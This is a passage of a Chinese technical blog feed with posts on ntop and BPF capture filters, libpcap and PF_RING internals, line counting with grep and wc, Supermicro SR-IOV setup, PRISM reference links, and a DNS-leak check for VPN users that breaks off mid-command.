        <content type="html"><![CDATA[<h2 id="免费许可">免费许可</h2><p>ntop 免费提供给学校以及研究机构使用。</p><p>申请地址：<a href="https://www.ntop.org/support/faq/do-you-charge-universities-no-profit-and-research/">https://www.ntop.org/support/faq/do-you-charge-universities-no-profit-and-research/</a></p><p>发邮件即可</p><h2 id="安装">安装</h2><p>可以参考 <a href="https://hongwangle.com/wp-content/uploads/2020/08/pf_ring-%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B-.pdf">Pf_ring安装和使用教程</a></p><p>好处是中文，但不全。</p><h3 id="从源代码构建">从源代码构建</h3><h3 id="使用包安装">使用包安装</h3><h2 id="开始抓包">开始抓包！</h2><h3 id="过滤规则">过滤规则</h3><p>ntop 使用的是 <strong>BPF 过滤规则</strong>。</p><h4 id="bpf简介">BPF简介</h4><p>BPF(Berkeley Packet Filter)全称为伯克利包过滤,是一种功能非常强大的过滤语法.这个语法被广泛应用于多种数据包嗅探软件,因为大部分数据包嗅探软件都依赖于使用BPF 的 libpcap/WinPcap 库.诸如 tcpdump, wireshark 等等</p><h5 id="bpf详解">BPF详解</h5><p>使用BPF语法创建的过滤器被称为表达式,并且每个表达式包含一个或多个原语.每个原语包含一个或多个限定词,然后跟着一个ID或者数字</p><h5 id="bpf限定词">BPF限定词:</h5><p>限定词 说明 例子 Type 指出ID或数字所代表的含义 host, net, port Dir指明数据包传输方向 src, dst Proto 限定所要匹配的协议 ether, ip, tcp,udp, http, ftp 表达式示例:</p><h5 id="过滤器示例">过滤器示例</h5><p>该表达式的含义是只捕获目的地址为192.168.0.10以及端口为80的tcp流量</p><p>可以使用以下3种逻辑运算符,对原语进行组合,从而创建出更高级的表达式</p><ul><li><code>&amp;&amp;</code>: 连接运算符 与</li><li><code>||</code>: 选择运算符 或</li><li><code>!</code>: 否定运算符 非</li></ul><h5 id="主机名和地址过滤器">主机名和地址过滤器</h5><p>大多数过滤器都专注于一个特定的网络设备.这种情况下,可以根据设备的MAC地址,IPv4地址,IPv6地址或者DNS主机名配置过滤规则</p><p>host限定词用于捕获特定主机名或IP地址的流量:</p><pre class="line-numbers language-none"><code class="language-none">host 192.168.10.1host fe80::3c42:d5ff:fe22:1d63host testserver<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果考虑到一台主机的IP地址会变化,可以加入ether限定词对MAC地址进行过滤:</p><p><code>ether host 3e:42:d5:22:1d:63</code></p><p>传输方向限定词可以用来捕获流入或流出某台主机的流量:</p><p><code>src host 192.168.10.1</code></p><p>当一个原语中没有指定一种类型限定符时,host限定词将作为默认选择:</p><p><code>src 192.168.10.1</code></p><p>端口和协议过滤器</p><p>不仅仅可以基于主机过滤,也可以基于端口进行过滤:</p><p><code>port 80</code></p><p>如果想要捕获非80端口的流量:</p><p><code>!port 80</code></p><p>端口限定符可以和传输方向限定符一起使用:</p><p><code>dst port 80</code></p><p>端口限定符也可以和某些基于端口之上的协议一起过滤:</p><p><code>tcp port 8080</code></p><p>另外一些协议并不能简单的使用端口定义:</p><pre class="line-numbers language-none"><code class="language-none">icmp!ip6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="协议域过滤器">协议域过滤器</h5><p>协议域过滤器是BPF语法的一个强大的功能,我们可以通过检查协议头的限定字节来创建基于某些数据的过滤器</p><p>代表目标不可达(类型3)信息的ICMP数据包:</p><p><code>icmp[0]==3 // ICMP 协议头的第一个字节是否等于3</code></p><p>代表echo请求(类型8)或echo回复(类型0)的ICMP数据包:</p><p><code>icmp[0]==8||icmp[0]==0</code></p><p>可以在偏移值的后面以冒号分隔加上一个数值,代表数据长度:</p><p><code>icmp[0:3]==0x030104</code></p><p>还有一种情况是一个字节中每一个比特位都是标志位,这样我们需要先引用相关的字节,再使用”位掩码”逐位地把我们需要检查的位分离出来:</p><pre class="line-numbers language-none"><code class="language-none">tcp[13]&amp;4==4ip[0] &amp; 0x0F &gt; 0x05<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="文档">文档</h5><ul><li><a href="https://www.cnblogs.com/zhongxinWang/-%20p/4303153.html">FreeSaber:伯克利包过滤（BerkeleyPacket Filter,BPF）语言</a></li><li>“Wireshark数据包分析实战(第二版)”</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ntop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS与抓包技术</title>
      <link href="/2022/10/04/os-yu-zhua-bao-ji-zhu/"/>
      <url>/2022/10/04/os-yu-zhua-bao-ji-zhu/</url>
      
        <content type="html"><![CDATA[<p>近期在研究 libpcap 和 PF_RING，写篇文章作为总结。</p><h2 id="pf_ring-使用">PF_RING 使用</h2><p>(To be continued)</p><h2 id="snort">Snort</h2><p>https://www.snort.org/</p><h2 id="linux-网络栈">Linux 网络栈</h2><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Linux%20%E7%BD%91%E7%BB%9C%E6%A0%88.gif" alt="Linux 网络栈"><figcaption aria-hidden="true">Linux 网络栈</figcaption></figure><h2 id="libpcap-抓包系统模型">Libpcap 抓包系统模型</h2><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Subsystems%20involved%20in%20the%20capturing%20process.png" alt="Subsystems involved in the capturing process"><figcaption aria-hidden="true">Subsystems involved in the capturingprocess</figcaption></figure><blockquote><p>上图为 libpcap 机制涉及的相关内容（简化）；</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Libpcap%20%E7%9A%84%E5%8C%85%E6%8D%95%E8%8E%B7%E6%9C%BA%E5%88%B6.png" alt="Libpcap 的包捕获机制"><figcaption aria-hidden="true">Libpcap 的包捕获机制</figcaption></figure><blockquote><p>上图为 libpcap 机制涉及的相关内容（详细）；</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/tcpdump%20%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A8%E6%A8%A1%E5%9E%8B.jpeg" alt="tcpdump程序调用模型"><figcaption aria-hidden="true">tcpdump程序调用模型</figcaption></figure><blockquote><p>上图标明基于 libpcap的抓包工具和常规应用程序使用不同的包处理路径（注意：此处的 libpcap是基于 PF_PACKET 的标准版本）；</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Elements%20involved%20in%20the%20capture%20process.png" alt="Elements involved in the capture process"><figcaption aria-hidden="true">Elements involved in the captureprocess</figcaption></figure><blockquote><p>这张图细化了 libpcap 的包处理路径（但没有明确指明 BPF 和 tap）；</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/libpcap%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.jpg" alt="libpcap工作原理"><figcaption aria-hidden="true">libpcap工作原理</figcaption></figure><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/packet%20path.png" alt="packet path"><figcaption aria-hidden="true">packet path</figcaption></figure><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B.png" alt="抓包流程"><figcaption aria-hidden="true">抓包流程</figcaption></figure><blockquote><p>以上三张图更加细化了 libpcap 的包处理路径，并明确给出了 libpcap的组成部分有 BPF 和 tap ；但没有提及 libpcap是在数据链路层上通过旁路进行的包处理，实际通过网络分接头（tap）从位于数据链路层的NIC driver 中进行的数据包拷贝；</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/BPF%20and%20ZC%20BPF.png" alt="BPF and ZC BPF"><figcaption aria-hidden="true">BPF and ZC BPF</figcaption></figure><blockquote><p>上图描述了基于 BPF 和 ZC BPF 的标准 libpcap实现是如何进行数据包读取的；</p></blockquote><h2 id="数据包接收">数据包接收</h2><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/linux-server-packet-fig-1.png" alt="linux-server-packet-fig"><figcaption aria-hidden="true">linux-server-packet-fig</figcaption></figure><blockquote><p>这张图给出了很多信息：</p><ul><li>可能导致丢包问题的两处缓冲区：Ring Buffer 和 poll_queue (perCPU)；其中 poll_queue 的 size 由内核参数 net.core.netdev_max_backlog决定，默认为 1000 ；</li><li>数据包（由网卡驱动程序）通过 DMA 方式从 NIC Rx queue拷贝到操作系统内核内存中（Ring Buffer 中保存的是内存索引）；</li><li>IRQ 和 softirq</li></ul></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8E%A5%E6%94%B6%E8%B7%AF%E5%BE%84.jpeg" alt="阿里技术保障提供"><figcaption aria-hidden="true">阿里技术保障提供</figcaption></figure><blockquote><p>这张图提供的有用信息：</p><ul><li>图中 Poll List 即前图中的 Poll_queue (per CPU) ；</li><li>Poll List 每个 CPU 一个，也称之为 backlog ，注意和图中 Socketbacklog 进行区分；</li><li>图中给出了 IP 层和 TCP 层的位置，以及两种类型 backlog所处位置；</li></ul></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/%E7%BD%91%E5%8D%A1%E6%94%B6%E5%8C%85%E6%B5%81%E7%A8%8B%E5%9B%BE.jpeg" alt="网卡收包流程图"><figcaption aria-hidden="true">网卡收包流程图</figcaption></figure><blockquote><p>上图给出了（单队列网卡）包处理相关的更多信息：</p><ul><li>物理层：NIC RX queue、NIC memory 和 NIC controller ；</li><li>链路层：NIC driver、NAPI、Ring Buffer</li><li>网络层：PF_PACKET</li><li>数据包通过 DMA 方式从物理层 NIC RX queue 拷贝到操作系统内存中；</li><li>NIC memory 中维护的是用于在 Ring Buffer 中进行位置定位的指针；而Ring Buffer 中的内容为指向保存 DMA 拷贝包的操作系统内存的指针； NICcontroller 通过 NIC memory 中的信息定位 Ring Buffer 的 head位置，之后触发 IRQ 给 CPU0 ； CPU0 通过 NIC driver、NAPI机制、PF_PACKET，以及 softirq 完成对操作系统内存中数据包的获取；</li></ul></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/%E5%A4%9A%E9%98%9F%E5%88%97%E7%BD%91%E5%8D%A1%E6%94%B6%E5%8C%85%E6%B5%81%E7%A8%8B%E5%9B%BE.jpeg" alt="多队列网卡收包流程图"><figcaption aria-hidden="true">多队列网卡收包流程图</figcaption></figure><blockquote><p>多队列网卡与单队列网卡的差别：</p><ul><li>NIC memory 维护多个 Ring Buffer 的 head/tail 索引信息；</li><li>链路层中包含多个 Ring Buffer（针对每个 RX queue 存在一个）</li></ul></blockquote><h2 id="pf_ring-相关">PF_RING 相关</h2><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Hardware%20Acceleration.png" alt="Hardware Acceleration"><figcaption aria-hidden="true">Hardware Acceleration</figcaption></figure><blockquote><p>硬件加速卡的实现：FPGA + NIC Memory Map 关键：专用、昂贵</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/PF_RING%20DNA.png" alt="PF_RING DNA"><figcaption aria-hidden="true">PF_RING DNA</figcaption></figure><blockquote><p>PF_RING DNA 对 Vanilla PF_RING 的改进：NIC NPU + NIC Memory Map关键：常规 Commodity NIC 即可达到专用硬件加速卡效果；</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/PF_RING-modules.jpeg" alt="PF_RING"><figcaption aria-hidden="true">PF_RING</figcaption></figure><h3 id="pf_ring-internals">PF_RING Internals</h3><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Socket%20Packet%20Ring_PF_RING.png" alt="Socket Packet Ring (PF_RING)"><figcaption aria-hidden="true">Socket Packet Ring (PF_RING)</figcaption></figure><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/PF_RING%20Internals.png" alt="PF_RING Internals"><figcaption aria-hidden="true">PF_RING Internals</figcaption></figure><p>值得注意的一个细节：</p><ul><li><code>netif_receive_skb()</code> 对应 NAPI</li><li><code>netif_rx()</code> 对应 No NAPI</li></ul><h3 id="pf_ring-packet-journey">PF_RING Packet Journey</h3><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/PF_RING%20Packet%20Journey%20-%201.png" alt="PF_RING Packet Journey - 1"><figcaption aria-hidden="true">PF_RING Packet Journey - 1</figcaption></figure><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/PF_RING%20Packet%20Journey%20-%202.png" alt="PF_RING Packet Journey - 2"><figcaption aria-hidden="true">PF_RING Packet Journey - 2</figcaption></figure><h2 id="libpcap-v.s.-pf_ring">libpcap v.s. PF_RING</h2><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/PF_RING%20and%20legacy%20architecture.png" alt="PF_RING and legacy architecture"><figcaption aria-hidden="true">PF_RING and legacyarchitecture</figcaption></figure><blockquote><p>PF_RING 的地位和 PF_PACKET 是类似的，本质上都是向内核注册了一种socket 类型；图中有一个地方画错了，即 Linux Network Stack上方应该是非抓包的其它服务，如 telnet 和 tftp 等；</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/PF_RING%20and%20PF_PACKET%20under%20Linux.png" alt="PF_RING and PF_PACKET under Linux"><figcaption aria-hidden="true">PF_RING and PF_PACKET underLinux</figcaption></figure><blockquote><p>基于 PF_PACKET 和 PF_RING 两种方式下的包处理路径对比：明显 PF_RING路径更短；这也就是为何 PF_RING 速度更快，更不容易丢包的原因；</p><p>另外，需要注意，Ethernet driver 和 Low-level packet reception 之间的<code>netif_rx()</code>/<code>netif_receive_skb()</code> 分别对应了 NoNAPI 和 NAPI ；而从 Ethernet driver上进行包搬移操作的应该是之前提及的、作为 libpcap组成部分之一的、网络分接头 tap ；</p><p><strong>PF_RING</strong> is a replacement for<strong>PF_PACKET</strong> that not only uses memory mapping instead ofprocessing expensive buffer copies from kernel space to userspace, butit also uses <strong>ring buffers</strong> making to transportation in amore efficient way.</p></blockquote><h2 id="napi-v.s.-tnapi">NAPI v.s. TNAPI</h2><h3 id="napi">NAPI</h3><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Enhanced%20NIC%20Drivers_Linux%20NAPI.png" alt="Enhanced NIC Drivers_Linux NAPI"><figcaption aria-hidden="true">Enhanced NIC Drivers_LinuxNAPI</figcaption></figure><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Linux%20NAPI%20Limitations%20-%201.png" alt="Linux NAPI Limitations"><figcaption aria-hidden="true">Linux NAPI Limitations</figcaption></figure><blockquote><p>上面两图说明：传统的 NAPI + RSS 方案存在问题，即 NAPI 对多 RX queue是顺序轮询的，并且在 driver 和用户应用的接口层存在 Merge &amp; Split等资源竞争问题；</p></blockquote><h3 id="tnapi">TNAPI</h3><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Enhanced%20NIC%20Drivers_TNAPI.png" alt="Enhanced NIC Drivers_TNAPI"><figcaption aria-hidden="true">Enhanced NIC Drivers_TNAPI</figcaption></figure><blockquote><p>上图说明：基于 TNAPI + PF_RING 解决了传统 NAPI 方案遇到的问题；</p></blockquote><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/Explaiting%20PF_RING%20Multi-Queue_nProbe.png" alt="Explaiting PF_RING Multi-Queue_nProbe"><figcaption aria-hidden="true">Explaiting PF_RINGMulti-Queue_nProbe</figcaption></figure><figure><img src="https://googles.plus/images/loading.gif" data-original="https://raw.githubusercontent.com/moooofly/ImageCache/master/Pictures/nCap%20and%20Legacy.png" alt="nCap and Legacy"><figcaption aria-hidden="true">nCap and Legacy</figcaption></figure><hr><h2 id="libpcap-抓包原理"><a href="https://www.oschina.net/action/GoToLink?url=http%3A%2F%2Fblog.163.com%2Fnobody_ppc%2Fblog%2Fstatic%2F35239432008330111658963">libpcap抓包原理</a></h2><p>libpcap (Packet Capture Library)，即数据包捕获函数库，是 Unix/Linux平台下的网络数据包捕获函数库。它是一个独立于系统的用户层包捕获的 API接口，为底层网络监测提供了一个可移植的框架。</p><h3 id="libpcap-工作原理">libpcap 工作原理</h3><p>libpcap 主要由两部份组成：</p><ul><li>网络分接头（Network Tap）</li><li>数据过滤器（Packet Filter）</li></ul><p><strong>网络分接头从网络设备驱动程序（NICdriver）中收集数据拷贝，过滤器决定是否接收该数据包</strong>。Libpcap利用 BSD Packet Filter (BPF)算法对网卡接收到的链路层数据包进行过滤。</p><p><strong>BPF 算法的基本思想</strong>：在有 BPF监听的网络中，网卡驱动将接收到的数据包复制一份交给 BPF过滤器，过滤器根据用户定义的规则决定<strong>是否接收此数据包</strong>以及<strong>需要拷贝该数据包的哪些内容</strong>，然后将过滤后的数据交给与过滤器相关联的上层应用程序。</p><p><strong>libpcap的包捕获机制</strong>：<strong>在数据链路层加一个旁路处理</strong>。当一个数据包到达网络接口时，libpcap首先利用已经创建的类型为 PF_PACKET 的 Socket，从位于<strong>链路层</strong>中的 NIC driver中获得数据包的拷贝，再通过 Tap 函数将数据包发给 BPF 过滤器。BPF过滤器根据用户已经定义好的过滤规则对数据包进行逐一匹配，匹配成功则放入内核缓冲区，进而传递给用户缓冲区，匹配失败则直接丢弃。如果没有设置过滤规则，所有数据包都将放入内核缓冲区，并传递给用户缓冲区。</p><h3 id="libpcap-的抓包框架">libpcap 的抓包框架</h3><ul><li><code>pcap_lookupdev()</code> 函数用于查找网络设备，返回可被<code>pcap_open_live()</code> 函数调用的网络设备名指针。</li><li><code>pcap_open_live()</code>函数用于打开网络设备，并且返回用于捕获网络数据包的数据包捕获描述字。对于此网络设备的操作都要基于此网络设备描述字。</li><li><code>pcap_lookupnet()</code>函数获得指定网络设备的网络号和掩码。</li><li><code>pcap_compile()</code>函数用于将用户制定的过滤策略编译到过滤程序中。</li><li><code>pcap_setfilter()</code> 函数用于设置过滤器。</li><li><code>pcap_loop()</code> 函数 <code>pcap_dispatch()</code>函数用于捕获数据包，捕获后还可以进行处理，此外 <code>pcap_next()</code>和 <code>pcap_next_ex()</code> 两个函数也可以用来捕获数据包。</li><li><code>pcap_close()</code> 函数用于关闭网络设备，释放资源。</li></ul><h3 id="libpcap-mmap">libpcap-mmap</h3><p>libpcap-mmap 是 libpcap的一个改进版本，它们捕获数据包的结构相同。不同的地方主要有以下两点：</p><ul><li>libpcap使用固定大小的<strong>存储缓冲器</strong>和<strong>保持缓冲器</strong>来完成数据包从内核缓冲区到用户缓冲区的传递，而libpcap-mmap设计了一个大小可以配置的<strong>循环缓冲器</strong>，允许用户程序和内核程序同时对该循环缓冲器的不同数据区域进行直接的读取。</li><li>在 libpcap 中，当网卡接收到一个数据包之后，网卡驱动程序通过 DMA方式调用系统函数 <code>netif_rx()</code> 将数据包从网卡（Rxqueue）拷贝到核心态内存，应用程序想访问位于核心态内存的数据时，就必须将数据包从核心态内存中拷贝到用户态内存中（即<strong>两次拷贝问题</strong>），这种方式会占用了很多系统资源，降低数据包捕获的性能以及对数据包的处理能力。而<strong>libpcap-mmap 采用 MMAP技术，建立核心态内存和用户态内存的映射</strong>，将系统分配给网卡设备文件的核心态内存映射到一块用户态内存，这样应用程序就可以通过系统函数<code>recvfrom()</code>把数据包从网卡设备文件对应的核心态内存上直接传送到用户态内存；</li></ul><hr><p><code>Libpcap</code> is one of the more vastly open source libraryfor packet capturing and uses by default <strong>PF_PACKET</strong>protocol in order to transfer the packets from the driver to theuserspace.</p><p>It is the de facto library that facilitates the packet transitionfrom kernel onto the userspace is libpcap. It provides an API for theprogrammer to select the capturing interface (device) and gives theability to compile <strong>Linux Packet Filters (LPF)</strong> into thekernel for selective packet capturing based on the 5 tuple (protocol,source/destination IP address and source/destination port).</p><p>One important feature of <strong>PF_RING</strong> is the way itexchanges packets between user space and kernel: Monitoring applicationsusually access a library like <code>libpcap</code> to retrieve capturedpackets from the kernel. Libpcap is an abstraction from the operatingsystems’ capturing mechanisms and allows to run a capturing applicationon several operating systems without porting it to the special capturingarchitecture. Back in 2004, the then current libpcap version<strong>0.9.8</strong> used a <strong>copy operation</strong> to passpackets from the kernel to the user space on Linux. An unofficial patchagainst that libpcap version from Phil Woods existed, which replaced thecopy operation by a <strong>shared memory area</strong> that was used toexchange packets between kernel and application. This modification willbe called MMAP throughout the rest of the paper. PF RING uses a similarstructure to exchange packets by default. Libpcap version<strong>1.0.0</strong>, which was released in late 2008, is the firstversion that ships built-in shared memory (SHM) exchange support; hencethe patch from Phil Woods is not longer necessary.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux下统计终端输出行数</title>
      <link href="/2022/10/04/linux-xia-tong-ji-zhong-duan-shu-chu-xing-shu/"/>
      <url>/2022/10/04/linux-xia-tong-ji-zhong-duan-shu-chu-xing-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="将输出通过管道传送给-wc">将输出通过管道传送给<code>wc</code></h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-Rl</span> <span class="token string">"curl"</span> ./ <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="使用--c">使用 <code>-c</code></h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-Rl</span> <span class="token string">"curl"</span> ./ <span class="token parameter variable">-c</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="真正的-gnu-玩家">真正的 GNU 玩家</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'/^$/d'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print NR}'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token parameter variable">-nr</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token parameter variable">-n</span> <span class="token string">'1p'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Supermicro开启SR-IOV把直通设备提供给多个虚拟机</title>
      <link href="/2022/10/04/supermicro-kai-qi-sr-iov-ba-zhi-tong-she-bei-ti-gong-gei-duo-ge-xu-ni-ji/"/>
      <url>/2022/10/04/supermicro-kai-qi-sr-iov-ba-zhi-tong-she-bei-ti-gong-gei-duo-ge-xu-ni-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="enable-sr-iov-for-nic-in-esxi-on-supermicro-host-machine">EnableSR-IOV for NIC in ESXi on Supermicro host machine</h1><h2 id="solution">Solution</h2><p>Most virtualization options are enabled by default on our mainboardsto ensure this please load BIOS optimized defaults. Only SR-IOV and ASPMare disabled by default which is needed for virtualization off PCIecards. To enable this feature go into the bios to the menu<code>Advanced\PCIe\PCI\PnP</code> Configuration set SR-IOV support to“<strong>Enabled</strong>”, and set ASPM Support to“<strong>Enabled</strong>”.</p><p>SR-IOV is required CPU with IOMMU (VT-d or AMD-V) support. User caninitially check CPU feature support list. With Intel CPU, please check<a href="https://ark.intel.com/content/www/us/en/ark.html#@Processors">Intelark</a>,</p><p>Second, system BIOS is also required to support. Intel VirtualizationTechnology (VT) with enabled state. VT-d to enabled state ACS supportand AFI forwarding (for some paritcular cards, such as nVidia T4) Inaddition, network adapter, controller or LOM are required to supportSR-IOV capability. For Intel network NIC, user can check the <a href="https://www.intel.com/content/www/us/en/support/articles/000005722/network-and-io/ethernet-products.html">article</a>with supported matrix,</p><p>Supermicro X10/X11 dual processors and multiple processorsmotherboards will support SR-IOV in supported Windows and Linux OSmatrix chart. User can check Supermicro compatiblity chart for bestpractice.</p><p>Trying to deploy SR-IOV with X10 UP may suffer from failure ofassignment due on ACS support inside Windows, this is due on limitationof the support from PEG and C220 series PCH. For X10 UP, such asX10SL7-F/X10SLE-DF/X10SDD-16C-F/X10SDD-F/X10SLA-F/X10SLD-F/X10SLD-HF/X10SLE-F/X10SLE-HF/X10SLH-F/X10SLL+-F/X10SLL-S/X10SLL-SF/X10SLM+-F/X10SLM+-LN4F/X10SLM-F,the default LOM/MicroLP network controller of those boards is with i210mostly. Intel i210 does not support SR-IOV feature. X10 UP PEG does notsupport SR-IOV, either.</p><p>Using X11 UP, such asX11SCD-F/X11SCE-F/X11SCH-F(-LN4F)/X11SCL-F/X11SCL-IF/X11SCL-LN4F/X11SCM-F/X11SSL-nF/X11SSM-F/X11SSL-F/X11SSL-CF/X11SSL/X11SSi-LN4F/X11SSH-TF/X11SSH-LN4F/X11SSH-F/X11SSH-CTF/X11SSE-F/X11SSD-F/X11SSA-F,those boards will be supported by Linux with pass-through and SR-IOV,according to <a href="https://access.redhat.com/documentation/en-us/red_hat_virtualization/4.0/html/hardware_considerations_for_implementing_sr-iov/index">Linuxarticle</a>,</p><p>For Windows DDA in X11 UP, it's not supported due on ACS missing byrunning "Get-NetadapterSriov" command.</p><p>If users use AMD platform, please check this <a href="https://www.supermicro.com/support/faqs/faq.cfm?faq=31883">FAQ</a>for AMD SR-IOV support.</p><h2 id="references">References:</h2><blockquote><p>https://www.supermicro.com/support/faqs/faq.cfm?faq=31936https://www.supermicro.com/support/faqs/faq.cfm?faq=27402</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HomeLab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PRISM of NSA</title>
      <link href="/2022/10/04/prism-of-nsa/"/>
      <url>/2022/10/04/prism-of-nsa/</url>
      
        <content type="html"><![CDATA[<h1 id="prism-of-nsa">PRISM of NSA</h1><h2 id="posts">Posts</h2><ul><li><a href="https://nsa.gov1.info/dni/prism.html">IC OFF THERECORD</a></li><li><a href="https://www.theguardian.com/world/interactive/2013/nov/01/prism-slides-nsa-document">NSAPrism program slides</a></li><li><a href="https://www.washingtonpost.com/wp-srv/special/politics/prism-collection-documents/">NSAslides explain the PRISM data-collection program</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> NSA </tag>
            
            <tag> PRISM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPN隧道中的DNS泄露风险</title>
      <link href="/2022/10/03/vpn-sui-dao-zhong-de-dns-xie-lu-feng-xian/"/>
      <url>/2022/10/03/vpn-sui-dao-zhong-de-dns-xie-lu-feng-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="vpn-隧道中的-dns-泄露风险">VPN 隧道中的 DNS 泄露风险</h1><h2 id="tldr">TL;DR</h2><p>Web 服务器通过构造 DNS 记录，从而获取客户端所使用的 DNS服务器地址。</p><h2 id="如何检测自己的-dns-是否泄露">如何检测自己的 DNS 是否泄露</h2><p>PoC: <a href="https://browserleaks.com/dns">DNS Leak Test</a></p><p>如果 DNS Servers 条目中没有出现自己的 ISP DNS的话，基本可以放心了。</p><p>如果出现了多个服务器，基本是服务提供商的负载均衡手段，可以忽略。</p><h3 id="中国-isp-服务器">中国 ISP 服务器</h3><p>如果很不幸，列表中出现了你所在省份、运营商、学校的DNS。那就<del>开香槟喽</del>非常遗憾了。证明服务器有可能通过某些手段得知你的大致属地。</p><h2 id="泄露利用基本原理">泄露利用基本原理</h2><p>抓包并观察打开 <a href="https://browserleaks.com/dns">DNS LeakTest</a> 后的网络请求，发现之后异步请求了一批格式形如<code>https://***********.4.browserleaks.org/get</code>的地址。其中*处为一个随机字符串，看来获取客户端 DNS 的 trick 基本就在这。</p><h3 id="google-dns-记录">Google DNS 记录</h3><pre class="line-numbers language-none"><code class="language-none">{  "Status": 0 /* NOERROR */,  "TC": false,  "RD": true,  "RA": true,  "AD": false,  "CD": false,  "Question": [    {      "name": "vp97h3wjo2tvwaiv.4.browserleaks.org.",      "type": 2 /* NS */    }  ],  "Authority": [    {      "name": "4.browserleaks.org.",      "type": 6 /* SOA */,      "TTL": 1800,      "data": "4.browserleaks.org. noc.browserleaks.org. 2017042745 7200 3600 1209600 3600"    }  ],  "Comment": "Response from 165.22.41.103."}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="local-dig-记录">Local dig 记录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>sfc9982@dev ~<span class="token punctuation">]</span>$ <span class="token function">dig</span> 